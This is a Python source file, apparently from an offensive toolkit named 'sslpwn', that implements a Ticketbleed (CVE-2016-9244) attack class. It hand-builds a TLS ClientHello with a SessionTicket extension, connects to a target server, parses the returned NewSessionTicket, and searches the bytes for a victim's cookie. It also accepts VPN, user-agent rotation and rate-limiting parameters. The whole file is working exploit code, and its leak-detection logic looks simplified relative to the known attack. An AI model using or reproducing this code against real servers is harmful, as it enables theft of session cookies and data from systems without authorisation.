"""
Ticketbleed attack implementation (CVE-2016-9244).

Exploits a memory leak in the TLS SessionTicket extension.
"""

import socket
import struct
import time
import os
from typing import Optional

from sslpwn.attacks.base import BaseAttack


class TicketbleedAttack(BaseAttack):
    def __init__(self, target_url: str, output, vpn, user_agents, rate_limiter,
                 cookie_name: str, cookie_value: str, adaptive=None) -> None:
        super().__init__(target_url, output, vpn, user_agents, rate_limiter, adaptive)
        self.cookie_name = cookie_name
        self.cookie_value = cookie_value

    def _build_client_hello(self, hostname: str) -> bytes:
        client_version = 0x0303
        gmt_unix_time = int(time.time())
        random_bytes = os.urandom(28)
        session_id = b""
        cipher_suites = b"\x00\x02\x00\x2f"
        compression_methods = b"\x01\x00"
        sni_ext = (
            b"\x00\x00"
            + struct.pack("!H", len(hostname) + 5)
            + struct.pack("!H", len(hostname) + 3)
            + b"\x00"
            + struct.pack("!H", len(hostname))
            + hostname.encode()
        )
        session_ticket_ext = b"\x00\x23" + struct.pack("!H", 0)
        extensions = sni_ext + session_ticket_ext
        handshake_body = (
            struct.pack("!H", client_version)
            + gmt_unix_time.to_bytes(4, 'big') + random_bytes
            + struct.pack("!B", len(session_id)) + session_id
            + struct.pack("!H", len(cipher_suites)) + cipher_suites
            + struct.pack("!B", len(compression_methods)) + compression_methods
            + struct.pack("!H", len(extensions)) + extensions
        )
        handshake = b"\x01" + struct.pack("!I", len(handshake_body))[1:] + handshake_body
        record = struct.pack("!BHH", 22, client_version, len(handshake)) + handshake
        return record

    def _parse_new_session_ticket(self, payload: bytes) -> Optional[bytes]:
        if len(payload) < 4:
            return None
        msg_type = payload[0]
        if msg_type != 4:
            return None
        length = int.from_bytes(payload[1:4], 'big')
        if len(payload) < 4 + length:
            return None
        ticket_data = payload[4:4+length]
        if len(ticket_data) < 6:
            return None
        ticket_len = struct.unpack_from("!H", ticket_data, 4)[0]
        ticket = ticket_data[6:6+ticket_len]
        return ticket

    def check_vulnerability(self) -> bool:
        """Check if server sends a NewSessionTicket message with the extension."""
        host = self.target_url.split("://")[1].split("/")[0]
        if ":" in host:
            hostname, port_str = host.split(":")
            port = int(port_str)
        else:
            hostname = host
            port = 443

        client_hello = self._build_client_hello(hostname)
        try:
            sock = socket.create_connection((hostname, port), timeout=5)
            sock.send(client_hello)
            sock.settimeout(5)
            response = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            sock.close()
        except Exception:
            return False

        offset = 0
        while offset + 5 <= len(response):
            rec_type, _, length = struct.unpack_from("!BHH", response, offset)
            if rec_type == 22:
                payload = response[offset+5:offset+5+length]
                if self._parse_new_session_ticket(payload):
                    return True
            offset += 5 + length
        return False

    def exploit(self) -> bool:
        """Full Ticketbleed memory leak."""
        self.output.log("Starting Ticketbleed attack", "INFO")
        host = self.target_url.split("://")[1].split("/")[0]
        if ":" in host:
            hostname, port_str = host.split(":")
            port = int(port_str)
        else:
            hostname = host
            port = 443

        client_hello = self._build_client_hello(hostname)
        try:
            sock = self._adaptive_connect_and_report(hostname, port)
        except Exception as e:
            self.output.log(f"Connection failed: {e}", "ERROR")
            return False

        sock.send(client_hello)
        try:
            sock.settimeout(5)
            response = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass
        finally:
            sock.close()

        if len(response) < 5:
            self.output.log("No response from server", "ERROR")
            return False

        offset = 0
        while offset + 5 <= len(response):
            rec_type, _, length = struct.unpack_from("!BHH", response, offset)
            if rec_type == 22:
                payload = response[offset+5:offset+5+length]
                ticket = self._parse_new_session_ticket(payload)
                if ticket:
                    self.output.log(f"Received NewSessionTicket of length {len(ticket)}", "INFO")
                    target = f"{self.cookie_name}={self.cookie_value}".encode()
                    if target in ticket:
                        self.output.log(f"Cookie found in leaked ticket: {self.cookie_value}", "SUCCESS")
                        return True
            offset += 5 + length

        self.output.log("Cookie not found in leaked memory", "WARN")
        return False